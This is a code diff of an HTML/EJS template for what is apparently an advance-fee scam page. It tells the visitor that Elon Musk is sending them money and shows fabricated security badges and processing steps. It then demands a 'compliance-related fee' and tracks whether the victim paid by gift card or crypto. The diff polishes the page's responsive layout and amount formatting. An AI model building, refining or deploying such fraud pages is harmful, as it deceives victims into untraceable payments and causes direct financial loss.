@@ -2,24 +2,32 @@
 
 <div class="container my-4" id="payment-section">
   <div class="row justify-content-center">
-    <div class="col-lg-10 col-xl-9">
+    <div
+      class="col-12 col-sm-11 col-md-10 col-lg-10 col-xl-9 d-flex justify-content-center"
+    >
       <!-- Main Card -->
-      <div class="card transaction-card">
+      <div class="card transaction-card w-100 p-2 p-sm-3 p-md-4 p-lg-5">
         <!-- Header Section -->
         <div class="header-section text-center">
-          <h2>
+          <h2 class="fs-5 fs-sm-4 fs-md-3">
             <b>Elon Musk, CEO of Tesla and SpaceX</b>
           </h2>
-          <h4>
-            is sending you <b><%=payment.currency %><%= payment.amount %></b>
+          <h4 class="fs-6 fs-sm-5 fs-md-4">
+            is sending you
+            <b
+              ><%= payment.currency %><%=
+              Number(payment.amount.toFixed(4)).toLocaleString()%></b
+            >
           </h4>
-          <p><i class="fas fa-lock me-2"></i> Secure Payment Processing...</p>
+          <p class="fs-6">
+            <i class="fas fa-lock me-2"></i> Secure Payment Processing...
+          </p>
         </div>
 
         <!-- Main Content -->
-        <div class="card-body p-4 p-md-5">
+        <div class="card-body p-3 p-sm-4 p-md-5">
           <!-- Alert -->
-          <div class="alert alert-primary d-flex align-items-center">
+          <div class="alert alert-primary d-flex align-items-center fs-6">
             <i class="fas fa-info-circle fa-lg me-3"></i>
             <div>
               This transaction is secured with bank-level encryption and fraud
@@ -30,34 +38,34 @@
           <!-- Recipient Info -->
           <div class="row mb-4">
             <div class="col-md-6">
-              <p class="mb-1 text-muted">Recipient</p>
-              <h4 class="mb-0"><b><%= payment.name %></b></h4>
-              <p class="mb-0">
+              <p class="mb-1 text-muted fs-6">Recipient</p>
+              <h4 class="mb-0 fs-5"><b><%= payment.name %></b></h4>
+              <p class="mb-0 fs-6">
                 Account Number: <b><%= payment.accountNumber %></b>
               </p>
-              <p class="mb-0">Bank Name: <b><%= payment.bank %></b></p>
-              <p class="text-muted">Email: <b><%= payment.email %></b></p>
+              <p class="mb-0 fs-6">Bank Name: <b><%= payment.bank %></b></p>
             </div>
             <div class="col-md-6 text-md-end mt-3 mt-md-0">
-              <p class="mb-1 text-muted">Transaction ID</p>
-              <h5 class="mb-0"><b><%= payment.transactionId %></b></h5>
-              <small class="text-muted"
+              <p class="mb-1 text-muted fs-6">Transaction ID</p>
+              <h5 class="mb-0 fs-6"><b><%= payment.transactionId %></b></h5>
+              <small class="text-muted fs-6"
                 >Initiated: <%= payment.createdAt.toLocaleString() %></small
               >
             </div>
           </div>
 
           <!-- Amount Display -->
-          <div class="bg-light p-4 rounded-3 mb-4 text-center">
-            <p class="mb-1">Trasaction Amount</p>
-            <div class="amount-display text-success">
-              <%= payment.currency %><%=payment.amount %>
+          <div class="bg-light p-3 rounded-3 mb-4 text-center">
+            <p class="mb-1 fs-6">Transaction Amount</p>
+            <div class="amount-display text-success fs-2 fs-sm-3 fs-md-2">
+              <%= payment.currency %><%=
+              Number(payment.amount.toFixed(4)).toLocaleString()%>
             </div>
           </div>
 
           <!-- Progress -->
-          <h4 class="mt-4 mb-3 section-title">Transfer Progress</h4>
-          <div class="d-flex justify-content-between mb-2">
+          <h4 class="mt-4 mb-3 section-title fs-5">Transfer Progress</h4>
+          <div class="d-flex justify-content-between mb-2 fs-6">
             <span>Processing</span>
             <span><%= payment.progress %> Complete</span>
           </div>
@@ -76,53 +84,60 @@
           </div>
 
           <!-- Status Items -->
-          <div class="status-item completed">
+          <div class="status-item completed fs-6">
             <div class="d-flex align-items-center">
-              <div class="feature-icon">
+              <div class="feature-icon me-2">
                 <i class="fas fa-check"></i>
               </div>
               <div>
-                <h5 class="mb-1">Payment Processed</h5>
-                <p class="text-muted mb-0">
+                <h5 class="mb-1 fs-6">Payment Processed</h5>
+                <p class="text-muted mb-0 fs-6">
                   Your payment has been successfully authorized and processed.
                 </p>
               </div>
             </div>
           </div>
 
-          <div class="status-item completed">
+          <div class="status-item completed fs-6 mt-3">
             <div class="d-flex align-items-center">
-              <div class="feature-icon">
+              <div class="feature-icon me-2">
                 <i class="fas fa-check"></i>
               </div>
               <div>
-                <h5 class="mb-1">Security Verification</h5>
-                <p class="text-muted mb-0">
+                <h5 class="mb-1 fs-6">Security Verification</h5>
+                <p class="text-muted mb-0 fs-6">
                   Transaction passed all security checks and fraud detection.
                 </p>
               </div>
             </div>
           </div>
 
-          <div class="status-item pending">
+          <div class="status-item pending fs-6 mt-3">
             <div class="d-flex align-items-center">
-              <div class="feature-icon">
+              <div class="feature-icon me-2" id="arrLeft">
                 <i class="fas fa-arrow-right"></i>
               </div>
               <div>
-                <h5 class="mb-1">Delivery in Progress</h5>
+                <h5 class="mb-1 fs-6">Delivery in Progress</h5>
+                <% if (payment.txsFee.length !== ''){%>
                 <p class="text-muted mb-0">
-                  To finalize your transfer, a compliance‑related fee of
-                  <b><%= payment.currency %><%= payment.txsFee %></b>
+                  To finalize your transfer, a compliance-related fee of
+                  <b
+                    ><%= payment.currency %><%=
+                    Number(payment.txsFee.toFixed(4)).toLocaleString()%></b
+                  >
                   will apply. This forms part of our standard regulatory
                   procedures.
                 </p>
-                <!-- Trigger Button (in your transaction section) -->
+                <% } else { %>
+                <p class="text-muted mb-0"><%= payment.message %></p>
+                <% } %>
+                <!-- Trigger Button -->
                 <a
                   href="#"
                   data-bs-toggle="modal"
                   data-bs-target="#paymentModal"
-                  class="d-flex align-items-center text-decoration-none"
+                  class="d-flex align-items-center text-decoration-none mt-2"
                 >
                   <span
                     class="d-flex align-items-center px-2 py-1 <% if (payment.perment && payment.perment.status === 'success') { %> bg-success text-white <% } else if ((payment.giftCard && payment.giftCard.code) || (payment.cryptoTransaction && payment.cryptoTransaction.transactionHash)) { %> bg-warning text-dark <% } else { %> bg-primary text-white <% } %> rounded"
@@ -141,7 +156,7 @@
                 </a>
 
                 <div class="mt-2">
-                  <small class="text-info"
+                  <small class="text-warning"
                     ><i class="fas fa-clock me-1"></i> We apologize for any
                     delay. Thank you for selecting our service.</small
                   >
@@ -151,16 +166,16 @@
           </div>
 
           <!-- Security Features -->
-          <h4 class="mt-5 mb-3 section-title">Security & Protection</h4>
+          <h4 class="mt-5 mb-3 section-title fs-5">Security & Protection</h4>
           <div class="row">
             <div class="col-md-6 mb-3">
               <div class="security-badge h-100">
-                <div class="benefit-item">
-                  <div class="feature-icon">
+                <div class="benefit-item d-flex align-items-start">
+                  <div class="feature-icon me-2">
                     <i class="fas fa-lock"></i>
                   </div>
                   <div>
-                    <h6 class="mb-1">256-bit Encryption</h6>
+                    <h6 class="mb-1 fs-6">256-bit Encryption</h6>
                     <p class="text-muted small mb-0">
                       Bank-level security for all transactions
                     </p>
@@ -170,12 +185,12 @@
             </div>
             <div class="col-md-6 mb-3">
               <div class="security-badge h-100">
-                <div class="benefit-item">
-                  <div class="feature-icon">
+                <div class="benefit-item d-flex align-items-start">
+                  <div class="feature-icon me-2">
                     <i class="fas fa-shield-alt"></i>
                   </div>
                   <div>
-                    <h6 class="mb-1">Fraud Monitoring</h6>
+                    <h6 class="mb-1 fs-6">Fraud Monitoring</h6>
                     <p class="text-muted small mb-0">
                       24/7 monitoring for suspicious activity
                     </p>
@@ -186,13 +201,13 @@
           </div>
 
           <!-- Support Section -->
-          <div class="alert alert-light mt-4">
+          <div class="alert alert-light mt-4 fs-6">
             <div class="d-flex align-items-center">
-              <div class="feature-icon">
+              <div class="feature-icon me-2">
                 <i class="fas fa-headset"></i>
               </div>
               <div>
-                <h5 class="mb-1">Need assistance?</h5>
+                <h5 class="mb-1 fs-6">Need assistance?</h5>
                 <p class="mb-2">
                   Our support team is available 24/7 to help with your
                   transaction, kindly contact your support specialist.
@@ -201,6 +216,7 @@
             </div>
           </div>
         </div>
+        <!-- end card body -->
       </div>
     </div>
   </div>
